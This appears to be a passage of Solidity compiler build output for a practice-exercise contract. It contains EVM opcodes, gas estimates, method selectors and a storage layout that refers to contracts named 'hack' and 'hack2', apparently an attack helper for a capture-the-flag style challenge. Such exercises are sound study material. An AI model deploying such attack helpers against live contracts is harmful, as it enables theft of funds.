JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xDBF16873 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x16B JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE90E2FED PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x8E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xA0 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA2B40D19 PUSH0 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xDD SWAP2 SWAP1 PUSH2 0x1E1 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF4 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x106 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x13A DUP3 PUSH2 0x111 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x14A DUP2 PUSH2 0x130 JUMP JUMPDEST DUP2 EQ PUSH2 0x154 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x165 DUP2 PUSH2 0x141 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x180 JUMPI PUSH2 0x17F PUSH2 0x10D JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x18D DUP5 DUP3 DUP6 ADD PUSH2 0x157 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1CB PUSH2 0x1C6 PUSH2 0x1C1 DUP5 PUSH2 0x196 JUMP JUMPDEST PUSH2 0x1A8 JUMP JUMPDEST PUSH2 0x19F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1DB DUP2 PUSH2 0x1B1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1F4 PUSH0 DUP4 ADD DUP5 PUSH2 0x1D2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH16 0x4EADAFDFBDC726329978C8B26DFB6016 PUSH26 0x2DE9E569C34B89ACB9FFED0D75A964736F6C63430008150033A2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDC DUP15 SWAP7 SWAP16 EQ CALL 0xBB PUSH1 0xB3 0xE6 0xB1 0xCA 0xEA 0xC3 PUSH26 0x6E8BA41FCB0E7A3A3A484E5FFA9E91312864736F6C6343000815 STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "645600",
						"executionCost": "674",
						"totalCost": "646274"
					},
					"external": {
						"deploy1(bytes32)": "infinite",
						"deploy2(bytes32)": "infinite",
						"exchangeSellerBytesHash()": "760",
						"get()": "infinite",
						"ha()": "infinite",
						"ha2()": "infinite"
					}
				},
				"methodIdentifiers": {
					"deploy1(bytes32)": "0fa4b410",
					"deploy2(bytes32)": "dec3c14f",
					"exchangeSellerBytesHash()": "b90365a7",
					"get()": "6d4ce63c",
					"ha()": "0a504439",
					"ha2()": "dffd9b23"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 360,
						"contract": "shoot/摸底1/3/1.sol:deployed",
						"label": "ha",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(hack)337"
					},
					{
						"astId": 363,
						"contract": "shoot/摸底1/3/1.sol:deployed",
						"label": "ha2",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(hack2)357"
					}
				],
				"types": {
					"t_contract(hack)337": {
						"encoding": "inplace",
						"label": "contract hack",
						"numberOfBytes": "20"
					},
					"t_contract(hack2)357": {
						"encoding": "inplace",
						"label": "contract hack2",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}